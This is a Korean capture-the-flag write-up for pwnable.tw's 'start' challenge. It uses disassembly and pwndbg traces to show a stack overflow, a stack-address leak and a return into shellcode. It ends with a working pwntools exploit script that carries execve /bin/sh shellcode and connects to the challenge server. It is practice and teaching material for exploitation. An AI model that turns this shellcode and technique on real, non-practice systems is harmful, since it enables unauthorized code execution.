# analysis
```python
pwndbg> checksec
[*] '/home/m444ndu/pwntw/start/start'
Arch: i386-32-little
RELRO: No RELRO
Stack: No canary found
NX: NX disabled
PIE: No PIE (0x8048000)
```  


```css
pwndbg> disass 0x8048060
Dump of assembler code for function _start:
0x08048060 <+0>: push esp
0x08048061 <+1>: push 0x804809d
0x08048066 <+6>: xor eax,eax
0x08048068 <+8>: xor ebx,ebx
0x0804806a <+10>: xor ecx,ecx
0x0804806c <+12>: xor edx,edx
0x0804806e <+14>: push 0x3a465443
0x08048073 <+19>: push 0x20656874
0x08048078 <+24>: push 0x20747261
0x0804807d <+29>: push 0x74732073
0x08048082 <+34>: push 0x2774654c "Let's start the CTF:"
0x08048087 <+39>: mov ecx,esp   <-
0x08048089 <+41>: mov dl,0x14   <-
0x0804808b <+43>: mov bl,0x1    <- 주목!
0x0804808d <+45>: mov al,0x4    <-
0x0804808f <+47>: int 0x80      <-
0x08048091 <+49>: xor ebx,ebx
0x08048093 <+51>: mov dl,0x3c
0x08048095 <+53>: mov al,0x3
0x08048097 <+55>: int 0x80
0x08048099 <+57>: add esp,0x14
=> 0x0804809c <+60>: ret
End of assembler dump.
```
`interrupt`로 `system call`을 하며 `read`와 `write`를 하는 간단한 구조를 가진 바이너리이다.

<br/>
  
  
스택에 데이터를 입력하며, **NX**가 걸리지 않았기 때문에 **stack**에 `shellcode`를 올려 `eip`를 조작해 익스를 할 수 있을 것이라고 간단히 유추해볼 수 있다. 한 가지 문제라면 **stack address**를 **leak**해야한다는 점인데, 위에 강조된 코드로 **main**문을 돌리면 첫 번째 메인 스택프레임의 `ret + 4`에 있는 값을 **leak** 할 수 있다. **leak** 해야하는 사정상 첫 번째 루틴에서는 `shellcode`를 올릴 수 없으니 두 번째 루틴에서 `shellcode`를 올리고 올린 주소로 `eip`를 컨트롤한다.
  
  
<br/>
  
  
다음은 첫 **input** 동작의 상태를 나타낸다. 여기서 주의해야할 점은 만약 `pwntool` 사용할 때, `sendline`을 사용한다면 뒤에 개행문자 `'\n' (\x0a)`가 붙는다는 점이다. 이게 왜 때문에 문제가 되냐면 본 스택프레임의 `ret + 4`에 위치하는 곳을 참조하여 `esp`를 **leak**하기 때문에, 개행문자가 붙으면 한 바이트가 변조된 값을 **leak**하게 된다....(ㅠㅠ 이거땜에 헛짓거리 오래 했다...)

  
  
```css
Breakpoint 1, 0x08048097 in _start ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*EAX 0x3
EBX 0x0
ECX 0xff94faf4 ◂— 0x2774654c ("Let'")
EDX 0x3c
EDI 0x0
ESI 0x0
EBP 0x0
ESP 0xff94faf4 ◂— 0x2774654c ("Let'")
*EIP 0x8048097 (_start+55) ◂— int 0x80
───────────────────────────────────[ DISASM ]───────────────────────────────────
► 0x8048097 <_start+55> int 0x80 <SYS_read>
fd: 0x0
buf: 0xff94faf4 ◂— 0x2774654c ("Let'")
nbytes: 0x3c
0x8048099 <_start+57> add esp, 0x14
0x804809c <_start+60> ret
0x804809d <_exit> pop esp
0x804809e <_exit+1> xor eax, eax
0x80480a0 <_exit+3> inc eax
0x80480a1 <_exit+4> int 0x80
0x80480a3 add byte ptr [eax], al
0x80480a5 add byte ptr [eax], al
0x80480a7 add byte ptr [eax], al
0x80480a9 add byte ptr [eax], al
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ ecx esp 0xff94faf4 ◂— 0x2774654c ("Let'")
01:0004│ 0xff94faf8 ◂— 0x74732073 ('s st')
02:0008│ 0xff94fafc ◂— 0x20747261 ('art ')
03:000c│ 0xff94fb00 ◂— 0x20656874 ('the ')
04:0010│ 0xff94fb04 ◂— 0x3a465443 ('CTF:')
05:0014│ 0xff94fb08 —▸ 0x804809d (_exit) ◂— pop esp
06:0018│ **0xff94fb0c** —▸ 0xff94fb**10** ◂— 0x1
07:001c│ 0xff94fb10 ◂— 0x1
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
► f 0 8048097 _start+55
Breakpoint * 0x08048097
```

  
  

다음은 esp를 leak하는 동작의 상태를 나타낸다.
```css
pwndbg>
0x0804808f in _start ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*EAX 0x4
EBX 0x1
ECX 0xff94fb0c —▸ 0xff94fb10 ◂— 0x1
EDX 0x14
EDI 0x0
ESI 0x0
EBP 0x0
ESP 0xff94fb0c —▸ 0xff94fb10 ◂— 0x1
*EIP 0x804808f (_start+47) ◂— int 0x80
───────────────────────────────────[ DISASM ]───────────────────────────────────
0x804809c <_start+60> ret
↓
0x8048087 <_start+39> mov ecx, esp
0x8048089 <_start+41> mov dl, 0x14
0x804808b <_start+43> mov bl, 1
0x804808d <_start+45> mov al, 4
► 0x804808f <_start+47> int 0x80 <SYS_write>
fd: 0x1
buf: 0xff94fb0c —▸ *0xff94fb10* ◂— 0x1 *<= leak 0xff94fb10*
n: 0x14
0x8048091 <_start+49> xor ebx, ebx
0x8048093 <_start+51> mov dl, 0x3c
0x8048095 <_start+53> mov al, 3
0x8048097 <_start+55> int 0x80
0x8048099 <_start+57> add esp, 0x14
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ ecx esp 0xff94fb0c —▸ 0xff94fb10 ◂— 0x1
01:0004│ 0xff94fb10 ◂— 0x1
02:0008│ 0xff94fb14 —▸ 0xff9512b7 ◂— './start'
03:000c│ 0xff94fb18 ◂— 0x0
04:0010│ 0xff94fb1c —▸ 0xff9512bf ◂— 0x52455355 ('USER')
05:0014│ 0xff94fb20 —▸ 0xff9512d0 ◂— 0x515f5451 ('QT_Q')
06:0018│ 0xff94fb24 —▸ 0xff9512f1 ◂— 0x5f6d7672 ('rvm_')
07:001c│ 0xff94fb28 —▸ 0xff95130d ◂— 0x4d4f4e47 ('GNOM')
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
► f 0 804808f _start+47
 
0x08048099 in _start ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
*EAX 0x1d
EBX 0x0
ECX 0xff94fb0c ◂— 0x90909090
EDX 0x3c
EDI 0x0
ESI 0x0
EBP 0x0
ESP 0xff94fb0c ◂— 0x90909090
*EIP 0x8048099 (_start+57) ◂— add esp, 0x14
───────────────────────────────────[ DISASM ]───────────────────────────────────
0x804808f <_start+47> int 0x80
0x8048091 <_start+49> xor ebx, ebx
0x8048093 <_start+51> mov dl, 0x3c
0x8048095 <_start+53> mov al, 3
0x8048097 <_start+55> int 0x80
► 0x8048099 <_start+57> add esp, 0x14
0x804809c <_start+60> ret
0x804809d <_exit> pop esp
0x804809e <_exit+1> xor eax, eax
0x80480a0 <_exit+3> inc eax
0x80480a1 <_exit+4> int 0x80
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ ecx esp 0xff94fb0c ◂— 0x90909090
... ↓
05:0014│ 0xff94fb20 ◂— 0x41414141 ('AAAA')
06:0018│ 0xff94fb24 ◂— 0x42424242 ('BBBB')
07:001c│ 0xff94fb28 —▸ 0xff95130a ◂— 0x4700296c /* 'l)' */
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
► f 0 8048099 _start+57

pwndbg> x/40wx 0xff94fb0c
0xff94fb0c: *0x90909090 0x90909090 0x90909090 0x90909090*
0xff94fb1c: *0x90909090* *0x41414141* *0x42424242* 0xff95130a <= rip 0x41414141, shellcode 0x42424242
0xff94fb2c: 0xff951339 0xff951351 0xff951371 0xff951386
0xff94fb3c: 0xff951399 0xff9513a9 0xff9513b6 0xff951487
  
pwndbg> ni
0x0804809c in _start ()

LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
EAX 0x1d
EBX 0x0
ECX 0xff94fb0c ◂— 0x90909090
EDX 0x3c
EDI 0x0
ESI 0x0
EBP 0x0
*ESP 0xff94fb20 ◂— 0x41414141 ('AAAA')
*EIP 0x804809c (_start+60) ◂— ret
───────────────────────────────────[ DISASM ]───────────────────────────────────
0x8048091 <_start+49> xor ebx, ebx
0x8048093 <_start+51> mov dl, 0x3c
0x8048095 <_start+53> mov al, 3
0x8048097 <_start+55> int 0x80
0x8048099 <_start+57> add esp, 0x14
► 0x804809c <_start+60> ret <0x41414141>

───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ esp 0xff94fb20 ◂— 0x41414141 ('AAAA')
01:0004│ 0xff94fb24 ◂— 0x42424242 ('BBBB')
02:0008│ 0xff94fb28 —▸ 0xff95130a ◂— 0x4700296c /* 'l)' */
03:000c│ 0xff94fb2c —▸ 0xff951339 ◂— 0x5f6d7672 ('rvm_')
04:0010│ 0xff94fb30 —▸ 0xff951351 ◂— 0x5353454c ('LESS')
05:0014│ 0xff94fb34 —▸ 0xff951371 ◂— 0x5f474458 ('XDG_')
06:0018│ 0xff94fb38 —▸ 0xff951386 ◂— 0x495f5451 ('QT_I')
07:001c│ 0xff94fb3c —▸ 0xff951399 ◂— 0x4e474f4c ('LOGN')
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
► f 0 804809c _start+60

pwndbg> p 0xff94fb24 - 0xff94fb10
$1 = 20
```
**별표시는 강조**
위의 결과에 따라 **leak**한 **stack** 주소 `+ 20` 위치에 `shellcode`가 들어감을 알 수 있음.

따라서 두 번째 **input**에서 `ret`를 **leak**한거 `+ 20`

  

# exploit
```python
#! /usr/bin/python
from pwn import *

#r = process('./start')
r = remote('chall.pwnable.tw',10000)
#context.log_level='debug'
#gdb.attach(r,'b* 0x08048097')

payload1 = ''
payload1 += 'A'*20
payload1 += p32(0x08048087)
r.sendafter("Let's start the CTF:",payload1)

leak = r.recv(4)
stack_addr = u32(leak)
success('stack_addr = '+hex(stack_addr))

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"+"\x68\x68\x2f\x62\x69\x6e\x89"+"\xe3\x89\xc1\x89\xc2\xb0\x0b"+"\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode2 = asm(shellcraft.i386.linux.sh())

payload2 = ''
payload2 += '\x90'*20
payload2 += p32(stack_addr+20)
payload2 += shellcode
r.send(payload2)

r.interactive()
```
